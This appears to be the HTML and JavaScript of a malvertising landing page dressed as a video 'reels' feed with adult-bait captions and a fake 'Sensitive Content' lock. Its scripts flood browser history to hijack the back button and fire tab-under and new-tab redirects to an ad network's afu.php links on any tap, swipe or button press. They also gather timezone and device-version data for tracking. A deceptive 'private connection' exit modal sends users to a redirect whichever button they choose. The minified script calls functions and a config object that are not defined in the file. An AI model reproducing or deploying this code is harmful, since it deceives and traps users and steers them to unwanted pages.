  <style>
    * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
    html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }
    .video-layer { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000; opacity: 0; transition: opacity 0.3s ease-out; pointer-events: none; }
    .video-layer.active { opacity: 1; z-index: 1; }
    .blur-overlay { position: absolute; inset: 0; z-index: 100; backdrop-filter: blur(15px) brightness(0.65); -webkit-backdrop-filter: blur(15px) brightness(0.65); display: none; flex-direction: column; align-items: center; justify-content: center; pointer-events: none; }
    .lock-badge { background: rgba(0, 0, 0, 0.45); border: 1px solid rgba(255, 255, 255, 0.25); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); padding: 24px 32px; border-radius: 28px; display: flex; flex-direction: column; align-items: center; gap: 14px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); transform: translateZ(0); }
    .lock-icon-wrap { width: 56px; height: 56px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .lock-badge h2 { color: #fff; margin: 0; font-size: 19px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
    .lock-badge p { color: rgba(255,255,255,0.9); margin: 0; font-size: 14px; text-align: center; }
    .reels-ui { position: absolute; inset: 0; z-index: 200; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.9) 100%); transform: translateZ(10px); }
    .modal-overlay { position: fixed; inset: 0; z-index: 9999; background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; animation: fadeIn 0.2s ease-out; }
    .modal-box { background: #1c1c1e; width: 85%; max-width: 320px; border-radius: 16px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); transform: scale(0.95); animation: popIn 0.2s forwards; overflow: hidden; }
    .modal-header { padding: 24px 20px; }
    .modal-icon { font-size: 36px; margin-bottom: 12px; display: block; }
    .modal-title { color: #fff; font-size: 20px; font-weight: 700; margin-bottom: 8px; }

    .modal-btn:last-child { border-right: none; }
    .modal-btn:active { background: #2c2c2e; }
    .btn-stay { color: #0a84ff; }
    .btn-leave { color: #8e8e93; font-weight: 400; }
    .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
    .back-area { padding: 20px; margin: -20px; cursor: pointer; display: flex; align-items: center; justify-content: center; pointer-events: auto; }
    .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }
    .right-actions { position: absolute; right: 8px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto; }
    .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(2px); margin-bottom: 2px; }
    .action-text { font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
    .bottom-info { padding: 16px; color: #fff; margin-right: 60px; pointer-events: auto; }
    .avatar { width: 36px; height: 36px; border-radius: 50%; background: #ff0050; border: 2px solid #fff; }
    .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); margin-bottom: 4px; }
    .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
    .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
    .slide-in-up { animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
    @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 1; } }
    @keyframes slideInUp { 0% { transform: translateY(100%); opacity: 1; } 100% { transform: translateY(0); opacity: 1; } }
    .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
    @keyframes shake { 10%, 90% { transform: translate3d(-2px, 0, 0); } 20%, 80% { transform: translate3d(4px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-6px, 0, 0); } 40%, 60% { transform: translate3d(6px, 0, 0); } }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
    .swipe-hint { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 50; pointer-events: none; display: flex; flex-direction: column; align-items: center; }
    .hand-icon { font-size: 50px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: swipeUp 1.8s infinite ease-in-out; }
    @keyframes swipeUp { 0% { transform: translateY(40px); opacity: 0; } 40% { opacity: 1; } 80% { opacity: 0; } 100% { transform: translateY(-60px); opacity: 0; } }
  </style>
</head>

<body>
<div class="reels-wrapper" id="click-trap">
  <video id="v1" class="video-layer active" playsinline webkit-playsinline muted loop preload="auto"></video>
  <video id="v2" class="video-layer" playsinline webkit-playsinline muted loop preload="auto"></video>

  <div id="blur-layer" class="blur-overlay">
    <div class="lock-badge" id="lock-badge">
      <div class="lock-icon-wrap">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
      </div>
      <h2 id="t-title">Sensitive Content</h2>
      <p id="t-desc">Tap to unblur and continue</p>
    </div>
  </div>

  <div id="exit-modal" class="modal-overlay">
    <div class="modal-box">
      <div class="modal-header">
        <span class="modal-icon">‚ö†Ô∏è</span>
        <div class="modal-title" id="m-title">Wait!</div>
        <div class="modal-text" id="m-text">You are closing a private connection. Access will be lost.</div>
      </div>
      <div class="modal-actions">
        <button class="modal-btn btn-leave" id="btn-leave">Leave</button>
        <button class="modal-btn btn-stay" id="btn-stay">Stay</button>
      </div>
    </div>
  </div>

  <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">üëÜ</div></div>

  <div class="reels-ui">
    <div class="top-bar">
      <div class="back-area" id="back-trigger">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
      </div>
      <div class="filter-pill">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon></svg>
        <span>Filters</span>
      </div>
    </div>

    <div class="right-actions">
      <div class="action-btn">
        <div class="icon-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg></div>
        <span class="action-text" id="ui-likes">93</span>
      </div>
      <div class="action-btn">
        <div class="icon-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path></svg></div>
        <span class="action-text">Share</span>
      </div>
      <div class="action-btn">
        <div class="icon-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/><path d="M18 7L21 4" stroke-width="2.5"/><path d="M14 10L12 7" stroke-width="2"/><path d="M20 10L22 13" stroke-width="2"/><path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/></svg></div>
      </div>
    </div>

    <div class="bottom-info">
      <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
        <div class="avatar" id="ui-avatar"></div>
        <div class="username" id="ui-username">@Sweet_Alice</div>
      </div>
      <div class="desc" id="ui-desc">Do you like my view? üòà <br>Check link in bio... üëá</div>
    </div>
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
  const reelsData = [
    {},
    { user: "@Sweet_Alice", likes: "93", desc: "Do you like my view? üòà <br>Check link in bio... üëá", color: "#ff0050" },
    { user: "@Naughty_Kate", likes: "12.4k", desc: "Wait for the end... üí¶ <br>Link in bio!", color: "#0095f6" }
  ];

  const translations = {
    en: { title: "Sensitive Content", desc: "Tap to unblur and continue", mTitle: "Wait!", mText: "You are closing a private connection. Access will be lost.", stay: "Stay", leave: "Leave" },
    ru: { title: "–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç", desc: "–ù–∞–∂–º–∏, —á—Ç–æ–±—ã —Å–º–æ—Ç—Ä–µ—Ç—å", mTitle: "–ü–æ–¥–æ–∂–¥–∏!", mText: "–í—ã –∑–∞–∫—Ä—ã–≤–∞–µ—Ç–µ –ø—Ä–∏–≤–∞—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ. –î–æ—Å—Ç—É–ø –±—É–¥–µ—Ç —É—Ç–µ—Ä—è–Ω.", stay: "–û—Å—Ç–∞—Ç—å—Å—è", leave: "–£–π—Ç–∏" }
  };

  const userLang = (navigator.language || "en").slice(0, 2).toLowerCase();
  const t = translations[userLang] || translations.en;
  document.getElementById("t-title").innerText = t.title;
  document.getElementById("t-desc").innerText = t.desc;
  document.getElementById("m-title").innerText = t.mTitle;
  document.getElementById("m-text").innerText = t.mText;
  document.getElementById("btn-stay").innerText = t.stay;
  document.getElementById("btn-leave").innerText = t.leave;

  const v1 = document.getElementById("v1"), v2 = document.getElementById("v2"), swipeHint = document.getElementById("swipe-hint");
  const blurLayer = document.getElementById("blur-layer"), lockBadge = document.getElementById("lock-badge"), wrapper = document.querySelector(".reels-wrapper");
  const backTrigger = document.getElementById("back-trigger"), exitModal = document.getElementById("exit-modal");
  const uiUser = document.getElementById("ui-username"), uiLikes = document.getElementById("ui-likes"), uiDesc = document.getElementById("ui-desc"), uiAvatar = document.getElementById("ui-avatar");

  const urlParams = new URLSearchParams(window.location.search);
  const offerID = urlParams.get("v") || "1";
  v1.src = `./assets/videos/lend${offerID}/reels-1.mp4`;
  v2.src = `./assets/videos/lend${offerID}/reels-2.mp4`;
  v1.play().catch(()=>{}); v2.load();

  let stage = 1, isAnimating = false, touchStartY = 0, lastInteractionIsSwipe = false;

  function doSwap(instant = false) {
    if (isAnimating && !instant) return;
    if (!instant) isAnimating = true;
    swipeHint.style.display = "none";
    uiUser.innerText = reelsData[2].user; uiLikes.innerText = reelsData[2].likes; uiDesc.innerHTML = reelsData[2].desc; uiAvatar.style.backgroundColor = reelsData[2].color;

    if (instant) {
      v1.classList.remove("active"); v1.pause(); v2.classList.add("active"); v2.play().catch(()=>{});
      blurLayer.style.display = "flex"; stage = 2;
    } else {
      v2.play().catch(()=>{}); v1.classList.add("slide-out-up"); v2.classList.add("slide-in-up");
      setTimeout(() => {
        v1.classList.remove("active","slide-out-up"); v1.pause(); v2.classList.add("active"); v2.classList.remove("slide-in-up");
        blurLayer.style.display = "flex"; stage = 2; isAnimating = false;
      }, 450);
    }
  }

  if (urlParams.get("restore") === "2") doSwap(true);

  wrapper.addEventListener("touchstart", e => { touchStartY = e.changedTouches[0].screenY; lastInteractionIsSwipe = false; }, {passive:true});
  wrapper.addEventListener("touchend", e => {
    const touchEndY = e.changedTouches[0].screenY;
    if (touchStartY - touchEndY > 50) {
      lastInteractionIsSwipe = true;
      if (stage === 1) { 
          doSwap(); 
          if(window.triggerBackFix) window.triggerBackFix(); // –§–∏–∫—Å –∏—Å—Ç–æ—Ä–∏–∏ –ø—Ä–∏ —Å–≤–∞–π–ø–µ
      } else triggerShake();
    }
  }, {passive:true});

  window.addEventListener("click", function(e) {
    if (e.target.closest("#exit-modal") || e.target.closest(".back-area")) return;
    if (stage === 1) {
      e.preventDefault(); e.stopPropagation(); doSwap();
      if (window.triggerBackFix) window.triggerBackFix(); // –§–∏–∫—Å –∏—Å—Ç–æ—Ä–∏–∏ –ø—Ä–∏ —Ç–∞–ø–µ
      return;
    }
    if (stage === 2 && lastInteractionIsSwipe) { triggerShake(); lastInteractionIsSwipe = false; return; }
    if (stage === 2 && !lastInteractionIsSwipe) { if (window.triggerMainExit) window.triggerMainExit(); }
  }, true);

  backTrigger.addEventListener("click", (e) => {
    if (stage === 1) { doSwap(); if (window.triggerBackFix) window.triggerBackFix(); } 
    else { exitModal.style.display = "flex"; }
  });

  function triggerShake() { lockBadge.classList.remove("shake"); void lockBadge.offsetWidth; lockBadge.classList.add("shake"); }
});
</script>

<script>
(()=>{

m=(e,t,n)=>(n=null!=e?a(d(e)):{},u(!t&&e&&e.__esModule?n:s(n,"default",{value:e,enumerable:!0}),e)),
h=(async()=>{var e=navigator;if(!e.userAgentData)return"";try{var t=["platformVersion"];return(await e.userAgentData.getHighEntropyValues(t)).platformVersion}catch(e){return""}}),
v=()=>"undefined"!=typeof Intl&&"function"==typeof Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:"",

p=new URL(window.location.href),
b={pz:p.searchParams.get("pz")||"",z:p.searchParams.get("z")||"",s:p.searchParams.get("s")||"",ymid:p.searchParams.get("ymid")||""},
f=async({zone:e})=>{var n=v(),r=U();let i={ymid:b.ymid,var:b.z,click_id:b.s,os_version:await h(),btz:n.toString(),bto:r.toString()};if(e)i.zoneid=e;return N(i)},
D=(t,n)=>{try{for(let e=0;e<n;e+=1)window.history.pushState(null,"",t);window.history.pushState(null,document.title,window.location.href)}catch(e){}},
P=async t=>{var t=null==t?void 0:t.back;if(t&&t.currentTab){var c=t.count||10;let e=window.location.origin+window.location.pathname;if(!e.includes("back.html")) e=e.substring(0,e.lastIndexOf('/')+1)+"back.html";let o=await f({zone:t.currentTab.zoneId});o.set("domain",t.currentTab.domain||APP_CONFIG.domain);D(decodeURIComponent(e+"?"+o.toString()),c)}},
S=async(e,t)=>{t=t.includes("http")?t:"https://"+t;let n=await f({zone:e.toString()});return decodeURIComponent(t+"/afu.php?"+n.toString())},
I=async(n,r)=>{var o=n[r];if(o){let e,t;if(o.currentTab) e=await S(o.currentTab.zoneId,o.currentTab.domain);if(o.newTab) t=await S(o.newTab.zoneId,o.newTab.domain);if(t){let w=window.open(t,"_blank");if(w)w.opener=null;if(e)window.location.replace(e)}else if(e)window.location.replace(e)}},
A=a=>{let{domain:s,...r}=a;return Object.entries(r).reduce((e,[t,n])=>{var r,[t,a,o]=t.split("_");return t&&(a==="currentTab"?(r=a,e[t]={...e[t],[r]:{domain:s,zoneId:n}}):a==="newTab"?(r=a,e[t]={...e[t],[r]:{domain:s,zoneId:n}}):e[t]={...e[t],[a]:n}),e},{})};

(async()=>{
  const sCfg = A(APP_CONFIG);
  window.triggerMainExit = async () => await I(sCfg, "mainExit");
  window.triggerBackFix = async () => await P(sCfg);

  // --- FIX STAY BUTTON (Manual TabUnder) ---
  const btnStay = document.getElementById("btn-stay");
  if(btnStay){
    const btn = btnStay.cloneNode(true); btnStay.parentNode.replaceChild(btn, btnStay);
    btn.onclick = async (e) => {
      e.preventDefault(); e.stopPropagation();
      if(window.syncMetric) window.syncMetric({event:"tabUnderClick",exitZoneId:APP_CONFIG.tabUnderClick_currentTab_zoneId});
      
      const params = new URLSearchParams(window.location.search);
      params.set('zoneid', APP_CONFIG.tabUnderClick_currentTab_zoneId);
      const offerUrl = `${APP_CONFIG.domain}/afu.php?${params.toString()}`;
      
      try {
        const link = document.createElement('a'); link.href = offerUrl; link.target = "_blank";
        document.body.appendChild(link); link.click();
        setTimeout(() => document.body.removeChild(link), 100);
        window.focus();
      } catch(err) {}
      
      document.getElementById("exit-modal").style.display = "none";
      return false;
    };
  }

  const btnLeave = document.getElementById("btn-leave");
  if(btnLeave){
    const btn = btnLeave.cloneNode(true); btnLeave.parentNode.replaceChild(btn, btnLeave);
    btn.onclick = async () => { await I(sCfg, "ageExit"); return false; };
  }
})();
})();
</script>
